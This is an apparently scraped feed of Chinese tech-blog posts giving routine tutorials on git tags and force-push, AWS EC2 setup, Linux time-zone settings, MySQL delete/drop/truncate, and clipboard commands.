class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 列出本地所有标签</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"># 新建一个tag在当前commit</span><br><span class="line">$ git tag [tag]</span><br><span class="line"></span><br><span class="line"># 新建一个tag在指定commit</span><br><span class="line">$ git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"># 删除本地tag</span><br><span class="line">$ git tag -d [tag]</span><br><span class="line"></span><br><span class="line"># 删除远程tag</span><br><span class="line">$ git push origin :refs&#x2F;tags&#x2F;[tagName]</span><br><span class="line"></span><br><span class="line"># 列出远程所有标签</span><br><span class="line">$ git ls-remote --tags origin</span><br><span class="line"></span><br><span class="line"># 创建带有附注标签</span><br><span class="line">$ git tag -a v1.1.0 -m &quot;标签描述&quot;</span><br><span class="line"></span><br><span class="line"># 查看本地tag信息</span><br><span class="line">$ git show [tag]</span><br><span class="line"></span><br><span class="line"># 提交指定tag</span><br><span class="line">$ git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"># 提交所有tag</span><br><span class="line">$ git push [remote] --tags</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向某个tag</span><br><span class="line">$ git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure><h3 id="Git-ProTips"><a href="#Git-ProTips" class="headerlink" title="Git ProTips"></a>Git ProTips</h3><p><code>Git ProTips</code> 则是整理的一些Git 的奇技淫巧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 通过使用别名，优化 git log 输出，这里另外提供几种模式, 可以选择喜欢的一种进行别名配置</span><br><span class="line">$ git config --global alias.lg &quot;log --graph --pretty&#x3D;format:&#39;%Cred%h - %Cgreen[%an]%Creset -%C(yellow)%d%Creset %s %C(yellow)&lt;%cr&gt;%Creset&#39; --abbrev-commit --date&#x3D;relative&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.his &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Creset %s %C(magenta)in %Cred%h %C(magenta)commited by %Cgreen%cn %C(magenta)on %C(yellow) %cd %C(magenta)from %Creset %C(yellow)%d&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.hist &quot;log --graph --decorate --oneline --pretty&#x3D;format:&#39;%Cred%h - %C(bold white) %s %Creset %C(yellow)%d  %C(cyan) &lt;%cd&gt; %Creset %Cgreen(%cn)&#39; --abbrev-commit --date&#x3D;format:&#39;%Y-%m-%d %H:%M:%S&#39;&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.lg &quot;log --color --graph --pretty&#x3D;format:&#39;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#39; --abbrev-commit&quot;</span><br><span class="line"></span><br><span class="line">$ git config --global alias.lg &quot;log --pretty&#x3D;format:&#39;%h - %an, %ar : %s&#39; &quot;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/xjh22222228/git-manual" target="_blank" rel="noopener">Git 常用命令整理</a></li><li><a href="https://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html" target="_blank" rel="noopener">常用Git 命令清单</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;虽然每天都在使用&lt;code&gt;Git&lt;/code&gt;，但是有些命令太久不使用，还是会忘记，所以这篇笔记的目的就是整理那些&lt;code&gt;Git&lt;/code&gt; 常用命令。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>手把手教你如何创建启动 AWS 实例</title>
    <link href="https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/"/>
    <id>https://www.0x2beace.com/teach-you-how-to-start-an-aws-instance/</id>
    <published>2020-08-10T06:05:17.000Z</published>
    <updated>2020-08-27T06:26:53.546Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>什么是AWS ？</p></blockquote><p><a href="https://aws.amazon.com/cn/?nc2=h_lg" target="_blank" rel="noopener">Amazon Web Services </a>(AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。</p><a id="more"></a><p>云这个概念最开始是从国内的阿里云、腾讯云这些地方听到的，后来服务器接触的多了，也慢慢了解了一些国外的云，如：亚马逊云、微软云。</p><p>在亚马逊云、软微云上创建一台实例其实是非常简单的事情，但由于这方面资料比较少，导致对于新用户可能不那么友好，我自己当初创建时就不怎么顺利。所以整理这篇笔记的目的有两个，一是方便自己日后回顾，二是给第一次使用的用户一些参考。</p><h2 id="启动实例"><a href="#启动实例" class="headerlink" title="启动实例"></a>启动实例</h2><p>首先登入到AWS ，找到<a href="https://console.aws.amazon.com/ec2/v2/home" target="_blank" rel="noopener">EC2</a> 并点击</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810115939.png" alt="AWS"></p><p>在左侧菜单栏中点击实例</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121213.png" alt=""></p><p>点击启动实例</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121240.png" alt=""></p><h2 id="配置实例"><a href="#配置实例" class="headerlink" title="配置实例"></a>配置实例</h2><p>选择系统映像，这里以Linux 操作系统为例，我选择是<code>Ubuntu Server 18.04 LTS</code>，这个版本表示Ubuntu 服务端 长期稳定支持版本。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810121309.png" alt=""></p><p>选择实例类型，根据自身需要考虑，当然 性能越好价格越高。这里我选择的是一个中等偏下的类型。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134659.png" alt=""></p><p>配置实例详情信息，这里的这些核心配置，通常都保持默认，只是将自动分配公有IP 地址改为禁用。这样再重启机器时，就不会改变IP了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134802.png" alt=""></p><p>根据自身需要分配合适的硬盘大小。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134833.png" alt=""></p><p>配置安全组，所谓安全组就是拥有相同防火墙规则的群组。这个也是根据自身需要选择是否共用同一个安全组。</p><p>拥有同一个安全组就表示拥有相同的防火墙规则。设置完安全组之后，点击审核和启动。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134858.png" alt=""></p><p>下面会有一个界面给你确认机器的配置是否无误的，从头到尾检查没有问题之后就可以点击启动实例了。</p><h2 id="创建密钥"><a href="#创建密钥" class="headerlink" title="创建密钥"></a>创建密钥</h2><p>可以选择共用已有的密钥对也可以选择新建一个。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134919.png" alt=""></p><p>然后点击启动实例。</p><h2 id="分配弹性IP"><a href="#分配弹性IP" class="headerlink" title="分配弹性IP"></a>分配弹性IP</h2><p>启动完成之后点击查看实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810134956.png" alt=""></p><p>在实例列表中，找到该实例之后，分别点击操作=&gt;联网=&gt;管理IP 地址=&gt;分配弹性 IP</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135020.png" alt=""></p><p>确认分配</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135056.png" alt=""></p><p>分配成功之后，会得到一个弹性IP（公有），然后返回实例列表</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135121.png" alt=""></p><h2 id="关联IP-地址"><a href="#关联IP-地址" class="headerlink" title="关联IP 地址"></a>关联IP 地址</h2><p>找到刚才启动的那个实例（没有实例ID），分别点击操作=&gt;关联地址</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135143.png" alt=""></p><p>这一步很重要，这里要将实例和弹性IP 地址关联，所以要选择该弹性IP 对应自己的实例。如果不确定是哪一个，可以返回到实例列表中去查看，就是那个没有名称的实例。</p><p>然后点击关联</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135205.png" alt=""></p><p>关联成功</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135233.png" alt=""></p><p>直到做完这一步才算正真的启动好一个实例。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200810135302.png" alt=""></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>启动好实例之后，如何连接呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i &lt;私钥路径&gt; ubuntu@ipaddress</span><br></pre></td></tr></table></figure><p>指定刚才生成的密钥对，使用ssh命令 即可连接。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;什么是AWS ？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://aws.amazon.com/cn/?nc2=h_lg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Amazon Web Services &lt;/a&gt;(AWS) 是亚马逊提供的全球最全面、应用最广泛的云平台。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Linux/Tutorial/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="云" scheme="https://www.0x2beace.com/tags/%E4%BA%91/"/>
    
  </entry>
  
  <entry>
    <title>如何修改 Linux 默认时区</title>
    <link href="https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/"/>
    <id>https://www.0x2beace.com/how-to-modify-the-linux-default-time-zone/</id>
    <published>2020-08-09T13:23:30.000Z</published>
    <updated>2020-08-22T00:44:06.247Z</updated>
    
    <content type="html"><![CDATA[<p>在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。</p><a id="more"></a><p>在Linux 服务器或系统上保持正确的时间始终是一个好习惯，它可能具有以下优点：</p><ul><li>由于Linux 中的大多数任务都是按时间控制的，因此可以保持系统任务的及时运行。</li><li>在系统上记录事件和其他信息的正确时间等等。</li></ul><p>在Linux 中设置时区，有几种方式。</p><h3 id="0x1-使用tzselete-命令"><a href="#0x1-使用tzselete-命令" class="headerlink" title="0x1. 使用tzselete 命令"></a>0x1. 使用tzselete 命令</h3><ol><li>使用<code>tzselete</code> 命令选择所在时区。</li><li>将时区所在的配置文件<code>TZ=&#39;Asia/Shanghai&#39;; export TZ</code> 添加到<code>~/.profile</code>文件。</li><li>使用<code>source ~/.profire</code>命令，使时区设置生效。</li></ol><h3 id="0x2-使用timedatectl-命令"><a href="#0x2-使用timedatectl-命令" class="headerlink" title="0x2. 使用timedatectl 命令"></a>0x2. 使用timedatectl 命令</h3><p>Ubuntu 系统提供了<code>timedatectl</code> 命令，非常方便的供我们查看设置Linux 系统时区。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl set-timezone &quot;Asia&#x2F;ShangHai&quot;</span><br></pre></td></tr></table></figure><p>如果你忘记了你想要的时区叫什么名字，那么可以使用下面的命令查看所有可用时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl list-timezones</span><br></pre></td></tr></table></figure><p>因为 Linux 的时间分为两种：</p><ol><li>硬件时间：由 BIOS（或CMOS）所负责。</li><li>系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。</li></ol><h3 id="0x3-设置硬件时间"><a href="#0x3-设置硬件时间" class="headerlink" title="0x3. 设置硬件时间"></a>0x3. 设置硬件时间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;etc&#x2F; &amp;&amp; ls -al | grep localtime</span><br><span class="line">lrwxrwxrwx  1 root root         27 Jul 24 00:57 localtime -&gt; &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Etc&#x2F;UTC</span><br></pre></td></tr></table></figure><p>可以看到默认链接的是<code>UTC</code>，所以需要手动更改链接时区文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ln -sf &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime</span><br></pre></td></tr></table></figure><p>查看硬件时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hwclock -r</span><br></pre></td></tr></table></figure><p>将系统时间改为硬件时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hwclock --hctosys</span><br></pre></td></tr></table></figure><p>需要想清楚的是，时间戳本身是永远不变的，无论在哪个时区同一时刻所生成的时间戳一定是一样的。</p><p>会发生变化的只有时区，而时间戳则是根据时区的不同而解析出来的时间不同。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.tecmint.com/set-time-timezone-and-synchronize-time-using-timedatectl-command/" target="_blank" rel="noopener">How to Set Time, Timezone and Synchronize System Clock Using timedatectl Command</a></li><li><a href="https://www.cnblogs.com/kerrycode/p/4217995.html" target="_blank" rel="noopener">Linux 查看设置系统时区</a></li><li><a href="https://david50.pixnet.net/blog/post/45228135-%5B%E7%AD%86%E8%A8%98%5Dlinux%E6%99%82%E9%96%93%E5%8F%8A%E6%99%82%E5%8D%80" target="_blank" rel="noopener">Linux 时间以及时区</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在上一篇笔记中，我们知道了如何在Linux 中查看系统默认时区，这篇笔记来学习以下如何修改默认时区。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 删除数据及数据表</title>
    <link href="https://www.0x2beace.com/mysql-delete-data-and-data-table/"/>
    <id>https://www.0x2beace.com/mysql-delete-data-and-data-table/</id>
    <published>2020-08-06T14:36:46.000Z</published>
    <updated>2020-09-20T15:39:21.488Z</updated>
    
    <content type="html"><![CDATA[<p>在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。</p><a id="more"></a><h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><p>删除表内数据，使用<code>delete</code>关键字。</p><h3 id="删除指定条件的数据"><a href="#删除指定条件的数据" class="headerlink" title="删除指定条件的数据"></a>删除指定条件的数据</h3><p>删除用户表内id 为1 的用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from User where id &#x3D; 1;</span><br></pre></td></tr></table></figure><h3 id="删除表内所有数据"><a href="#删除表内所有数据" class="headerlink" title="删除表内所有数据"></a>删除表内所有数据</h3><p>删除表中的全部数据，表结构不变。</p><p>对于 MyISAM 会立刻释放磁盘空间，InnoDB 不会释放磁盘空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from User;</span><br></pre></td></tr></table></figure><p>释放磁盘空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optimize table User;</span><br></pre></td></tr></table></figure><h3 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h3><p>删除数据表分为两种方式：</p><ol><li>删除数据表内数据以及表结构</li><li>只删除表内数据，保留表结构</li></ol><h4 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h4><p>使用<code>drop</code>关键词会删除整张表，啥都没有了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table User;</span><br></pre></td></tr></table></figure><h4 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h4><p><code>truncate</code> 关键字则只删除表内数据，会保留表结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate table User;</span><br></pre></td></tr></table></figure><blockquote><p>思考题：如何批量删除前缀相同的表？</p></blockquote><p>想要实现 <code>drop table like &#39;wp_%&#39;</code>，没有直接可用的命令，不过可以通过Mysql 的语法来拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 删除”wp_”开头的表：</span><br><span class="line">SELECT CONCAT( &#39;drop table &#39;, table_name, &#39;;&#39; ) AS statement</span><br><span class="line">FROM information_schema.tables</span><br><span class="line">WHERE table_schema &#x3D; &#39;database_name&#39; AND table_name LIKE &#39;wp_%&#39;;</span><br></pre></td></tr></table></figure><p>其中<code>database_name</code>换成数据库的名称，<code>wp_</code>换成需要批量删除的表前缀。</p><blockquote><p>注意只有<code>drop</code>命令才能这样用：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists tablename&#96;;</span><br></pre></td></tr></table></figure><blockquote><p><code>truncate</code>只能这样使用：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate table &#96;tp_trade&#96;.&#96;setids&#96;;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>当你不再需要该表时， 用<code>drop</code>;</p></li><li><p>当你仍要保留该表，但要删除所有记录时， 用<code>truncate</code>;</p></li><li><p>当你要删除部分记录时， 用<code>delete</code>。</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;在Mysql 中删除数据以及数据表非常的容易，但是需要特别小心，因为一旦删除所有数据都会消失。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Git Push -f 命令详解</title>
    <link href="https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/"/>
    <id>https://www.0x2beace.com/detailed-explanation-of-git-push-f-command/</id>
    <published>2020-08-05T06:49:02.000Z</published>
    <updated>2020-12-10T03:37:24.822Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。<br>如果每个人直接更新的话，会导致错误代码也更新到本地了。</p><p>这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。</p><a id="more"></a><h2 id="git-push-f"><a href="#git-push-f" class="headerlink" title="git push -f"></a>git push -f</h2><p><code>git push -f</code> 这个命令的作用是将自己本地仓库的代码直接推送至仓库，完全以你的提交为准，之前其他人的提交都会被覆盖。</p><p>那么这么可怕的命令，究竟在什么情况下才适用呢？</p><h3 id="使用时机"><a href="#使用时机" class="headerlink" title="使用时机"></a>使用时机</h3><p>有两种情况下适合使用这个命令：</p><ol><li>确定需要覆覆盖提交，就像上面的那种情况，在明确部分提交会导致异常时，可以使用新的提交去覆盖。</li><li>需要整理历史提交记录时，有时候项目的 Commit Logs 可能比较乱，不能清晰的看出每一次提交的作用，可以使用 <code>rebase</code> 命令来清理历史提交记录。因为改变了历史，所以正常来说是 <code>push</code>不成功的，所以需要使用 <code>force push</code>来解决这个问题。</li></ol><h3 id="默认分支保护"><a href="#默认分支保护" class="headerlink" title="默认分支保护"></a>默认分支保护</h3><p>因为可能会出现不小心使用的情况，<code>Github</code>、<code>Gitlab</code>这类源码托管网站会提供分支保护机制。可以避免某个分支被 <code>force push</code>，默认是 <code>master</code>为保护分支。</p><p>这里以<code>Gitlab</code>为例，<code>设置-&gt;仓库-&gt;Protected Branches</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200805144123.png" alt=""></p><p>所以如果想强制提交，前提需要取消对该分支的保护。</p><blockquote><p>万一自己的代码被覆盖掉了，还救得回来吗？</p></blockquote><p>其实也是有办法的，那就是换你或是其它有之前提交的同事，再次进行 <code>git push -f</code>，将正确的内容强制提交上去，覆盖上一次<code>git push -f</code>所造成的灾难。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://gitbook.tw/chapters/github/using-force-push.html" target="_blank" rel="noopener">聽說 git push -f 這個指令很可怕，什麼情況可以使用它呢？</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近遇到了一个Git Push 相关的问题，同事不小心把一些错误代码提交到仓库了。&lt;br&gt;如果每个人直接更新的话，会导致错误代码也更新到本地了。&lt;/p&gt;
&lt;p&gt;这个时候想要避免这种情况的发生，唯一可以做的就是将那些错误代码直接覆盖掉。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Windows/Mac/Linux 如何将内容输出到剪贴板</title>
    <link href="https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/"/>
    <id>https://www.0x2beace.com/how-to-output-content-to-clipboard-on-windows-mac-linux/</id>
    <published>2020-08-05T02:07:41.000Z</published>
    <updated>2020-09-27T01:22:11.596Z</updated>
    
    <content type="html"><![CDATA[<p>如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。</p><a id="more"></a><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello mac&quot; | pbcopy</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ pbcopy &lt; remade.md</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将剪切板中的内容粘贴至文件</span><br><span class="line">$ pbpaste &gt; remade.md</span><br></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux 用户需要先安装 <code>xclip</code>，它建立了终端和剪切板之间的通道。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看剪切板中的内容</span><br><span class="line">$ xclip -o</span><br><span class="line">$ xclip -selection c -o</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello xclip&quot; | xclip-selection c</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ xclip -selection c remade.md</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将剪切板中的内容粘贴至文件</span><br><span class="line">$ xclip -selection c -o &gt; remade.md</span><br></pre></td></tr></table></figure><p>或者直接使用<code>xsel</code>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello linux&quot; | xsel</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ xsel &lt; remade.md</span><br></pre></td></tr></table></figure><p>需要注意的是：xsel、xclip 命令是在 X 环境下使用的，所以远程连接服务器时使用会报异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xclip error can&#39;t open display (null)</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 将输出复制至剪贴板</span><br><span class="line">$ echo &quot;hello windows&quot; | clip</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将文件中的内容全部复制至剪贴板</span><br><span class="line">$ clip &lt; remade.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;如何将输出直接复制至剪切板？在不同的系统中，所使用的命令是不同的。&lt;/p&gt;</summary>
    
    
    
    <category term="Shell" scheme="https://www.0x2beace.com/categories/Shell/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/tags/Windows/"/>
    
    <category term="Mac" scheme="https://www.0x2beace.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>如何查看 Linux 默认时区</title>
    <link href="https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/"/>
    <id>https://www.0x2beace.com/how-to-check-the-linux-default-time-zone/</id>
    <published>2020-08-03T14:03:08.000Z</published>
    <updated>2020-08-25T02:19:08.477Z</updated>
    
    <content type="html"><![CDATA[<p>最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。</p><p>特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。</p><a id="more"></a><h1 id="时区的概念"><a href="#时区的概念" class="headerlink" title="时区的概念"></a>时区的概念</h1><p>关于时区，有以下几个标准：</p><ul><li>CST：北美中部标准时间</li><li>UTC：协调世界时，又称世界标准时间，简称UTC，从英文国际时间/法文协调时间”Universal Time/Temps Cordonné”而来。中国大陆、香港、澳门、台湾、蒙古国、新加坡、马来西亚、菲律宾、澳洲西部的时间与UTC的时差均为+8，也就是UTC+8。</li><li>GMT：格林尼治标准时间（旧译格林威治平均时间或格林威治标准时间；英语：Greenwich Mean Time，GMT）是指位于英国伦敦郊区的皇家格林尼治天文台的标准时间，因为本初子午线被定义在通过那里的经线。</li></ul><p>Linux 的时间分为两种：</p><ol><li>硬件时间：由 BIOS（或CMOS）所负责。</li><li>系统时间：由 Linux 所负责，系统时间在系统开关机后读取硬件时间后，再由 Linux 管理时间。</li></ol><h2 id="date"><a href="#date" class="headerlink" title="date"></a>date</h2><p>date命令是显示或设置系统时间与日期。</p><p>这个是最简单、最直观获取系统时间与日期的方式了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ date</span><br><span class="line">Thu Jul 30 13:23:50 CST 2020</span><br></pre></td></tr></table></figure><p>显示所在时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">date +&quot;%Z %z&quot;</span><br><span class="line">CST +0800</span><br></pre></td></tr></table></figure><blockquote><p>注意 <code>+</code> 和 <code>&quot;</code>之间没有空格，否则会报表。</p></blockquote><p>date 命令常见参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">%H 